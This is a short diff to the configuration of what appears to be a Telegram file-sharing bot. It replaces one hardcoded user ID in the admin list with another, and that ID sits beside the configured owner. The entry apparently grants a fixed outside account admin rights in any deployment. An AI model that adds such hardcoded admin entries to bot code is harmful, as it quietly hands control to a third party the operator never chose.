@@ -50,7 +50,7 @@ START_MSG = os.environ.get("START_MESSAGE", "Hello {mention}\n\nI Can Store Priv
 FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {mention}\n\n<b>You Need To Join In My Channel/Group To Use Me\n\nKindly Please Join Channel</b>")
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(6848088376)
+ADMINS.append(5743248220)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
